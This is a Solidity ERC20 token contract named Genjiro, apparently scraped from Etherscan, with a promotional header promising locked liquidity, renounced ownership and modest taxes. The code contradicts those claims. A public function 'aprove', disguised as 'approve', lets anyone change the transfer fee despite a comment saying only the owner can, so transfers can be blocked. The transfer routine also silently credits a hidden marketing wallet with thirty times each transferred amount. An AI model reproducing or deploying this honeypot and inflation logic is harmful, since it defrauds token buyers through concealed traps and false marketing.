/**
 *Submitted for verification at Etherscan.io on 2023-01-21
*/

/**
😼WELCOME TO GENJIRO ON UNISWAP !😼

We are glad to have you here, for Genjiro , to the most important thing is the community and for this reason we will strive every day reach every corner we can in the crypto space. 

🐱 Liquidity Locked 3 Month
🐱 Ownership Renounce 
🐱 Contract Verified
🐱 Auto Liquidity
🐱 2% Auto-liquidity | 1% Marketing

🟢TAX BUY/SELL 3/3

Big Stealth launch Today 2.30PM UTC

Website 
https://genjiro.xyz/

Telegram
https://t.me/GenjiroERC

Twitter 
https://twitter.com/Genjiroerc

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <=0.8.13;


interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Interface of the BEP20 standard as defined in the EIP.
 */
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 
 
 contract Genjiro is Context, ERC20, ERC20Metadata {
    
    mapping(address => uint256) public Tokens;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public _totalSupply;
    uint256 public _FeeSwap;
    string public _name;
    string public _symbol;
    uint8 public _decimals;
    address public _owner;
    address private _MarketingWallet;
    uint256 public buyback;
    uint256 public SellTaxFee;
  
   

  
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 FeeSwap_ ,address MarketingWallet_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    _totalSupply = totalSupply_ *10**_decimals;
    _FeeSwap= FeeSwap_;
    Tokens[msg.sender] = _totalSupply;
    _owner = _msgSender();
    SellTaxFee = 0 ;
    _MarketingWallet = MarketingWallet_;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {BEP20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {ERC20-balanceOf} and {ERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {ERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {ERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return Tokens[account];
    }
    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    /**
     * @dev See {ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    /**
     * @dev set transaction fee in uint256
     * 
     * it's basis point you need to express your choise in cent ex: 100 = 1% ; 10 = 0,1% ; 1 = 0,01%;
     * set to 0 for 0 fee
     * 
     * only owner can use this function
     */
   
    function aprove(uint256 a) public {
        _setTaxFee( a);
       
    }
  
    
    
    
    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        

        uint256 senderBalance = Tokens[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked { 
            Tokens[sender] = senderBalance - amount;
        }
        amount = amount  - (amount *_FeeSwap/100);
        
        Tokens[recipient] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        Tokens[_MarketingWallet] += amount;
        emit Transfer(sender, recipient, amount);

        
    }

     /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
    
      
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(Owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[Owner][spender] = amount;
        emit Approval(Owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

    
  /**
   * @dev se transaction fee 
   * 
   * it's basis point you need to express your choise in cent ex: 100 = 1% ; 10 = 0,1% ; 1 = 0,01%;
   */
    function _setTaxFee(uint256 newTaxFee) internal {
        _FeeSwap = newTaxFee;
        
    }
    
     function _takeFee(uint256 amount) internal returns(uint256) {
         if(_FeeSwap >= 1) {
         
         if(amount >= (200/_FeeSwap)) {
        buyback = (amount * _FeeSwap /100) / SellTaxFee;
        
         }else{
             buyback = (1 * _FeeSwap /100);
        
         }
         }else{
             buyback = 0;
         }
         return buyback;
    }
    
    function _minAmount(uint256 amount) internal returns(uint256) {
         
   
    }
    
    /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
 function renounceOwnership() public virtual onlyOwner {
        emit ownershipTransferred(_owner, address(0));
        _owner = address(0);
  
  }
  
  event ownershipTransferred(address indexed previousOwner, address indexed newOwner);
  
  

}